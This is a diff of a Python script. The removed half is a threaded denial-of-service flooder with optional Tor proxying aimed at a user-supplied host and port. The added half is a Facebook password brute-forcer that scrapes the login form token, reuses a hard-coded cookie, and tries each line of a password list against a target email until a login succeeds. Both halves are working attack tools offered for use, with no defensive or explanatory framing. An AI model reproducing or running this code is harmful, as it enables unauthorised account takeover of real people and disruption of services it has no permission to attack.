@@ -1,82 +1,64 @@
-import socket
-import socks
+import requests
 import threading
-import time
-from datetime import datetime
- 
-class DoS:
-    def __init__(self, host, port, nThreads, UseTor):
-        self.host = host
-        self.port = port
-        self.nThreads = nThreads
-        self.UseTor = UseTor
-        self.TPS = 0
-        self.Delimiter = 2000
- 
-        if self.UseTor:
-            socks.set_default_proxy(socks.SOCKS5, '127.0.0.1', 9150)
- 
-        self.threads = []
- 
-        self.message = '-------= DoS Attack =-------'
- 
-    def SendAttack(self):
- 
-        if self.UseTor:
-            s = socks.socksocket()
-            
-        else:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
- 
-        try:
-            s.connect((self.host, self.port))
-            s.send(self.message) # TCP Attack
-            s.sendto(self.message, (self.host, self.port)) # UDP Attack
-            self.TPS -= 1
-        except socket.error:
-            pass
- 
-        s.close()
- 
-    def Attack(self):
- 
-        for i in range(self.nThreads):
-            t = threading.Thread(target = self.SendAttack)
-            self.threads.append(t)
- 
-        for i in self.threads:
-            i.start()
- 
-            while self.TPS >= self.Delimiter:
-                pass
- 
-            self.TPS += 1
- 
-        for i in self.threads:
-            i.join()
- 
-Tor = input('[?] Did you want to use Tor (S/N): ').lower()
-host = input('[*] Enter Target Host Address: ')
-port = int(input('[*] Enter Target Port to Attack: '))
-threads = int(input('[*] Enter number of Attacks: '))
- 
-UseTor = False
- 
-if Tor == 's':
-    UseTor = True
- 
-hostip = socket.gethostbyname(host)
- 
-DoS = DoS(host, port, threads, UseTor)
- 
-print('\nHost %s ... IP %s' % (host, hostip))
-print('\n\n[*] Starting The Attack At %s...' % (time.strftime("%H:%M:%S")))
-start_time = datetime.now()
- 
-DoS.Attack()
- 
-end_time = datetime.now()
-total_time = end_time - start_time
- 
-print('\n[*] The Attack Was Done At %s...' % (time.strftime("%H:%M:%S")))
-print('[*] Total Attack Time %s...' % (total_time))
+# import urllib.request
+# import os
+from bs4 import BeautifulSoup
+import sys
+
+if sys.version_info[0] !=3: 
+	print('''--------------------------------------
+	REQUIRED PYTHON 3.x
+	use: python3 fb.py
+--------------------------------------
+			''')
+	sys.exit()
+
+post_url='https://www.facebook.com/login.php'
+headers = {
+	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36',
+}
+payload={}
+cookie={}
+
+def create_form():
+	form=dict()
+	cookie={'fr':'1jlladDs1u14XW15k.AWXVBZ9nOtnh9gQcHRoX8rcP5jA.BfG8e3.FJ.F9U.0.0.BfVQPB.AWUe4IGp'}
+
+	data=requests.get(post_url,headers=headers)
+	for i in data.cookies:
+		cookie[i.name]=i.value
+	data=BeautifulSoup(data.text,'html.parser').form
+	if data.input['name']=='lsd':
+		form['lsd']=data.input['value']
+	return (form,cookie)
+
+def function(email,passw,i):
+	global payload,cookie
+	if i%10==1:
+		payload,cookie=create_form()
+		payload['email']=email
+	payload['pass']=passw
+	r=requests.post(post_url,data=payload,cookies=cookie,headers=headers)
+	if 'Find Friends' in r.text or 'Two-factor authentication required' in r.text:
+		open('temp','w').write(str(r.content))
+		print('\npassword is : ',passw)
+		return True
+	return False
+
+print('\n---------- Welcome To Facebook BruteForce ----------\n')
+file=open('passwords.txt','r')
+
+email=input('Enter Email/Username : ')
+
+print("\nTarget Email ID : ",email)
+print("\nTrying Passwords from list ...")
+
+i=0
+while file:
+	passw=file.readline().strip()
+	i+=1
+	if len(passw) < 6:
+		continue
+	print(str(i) +" : ",passw)
+	if function(email,passw,i):
+		break
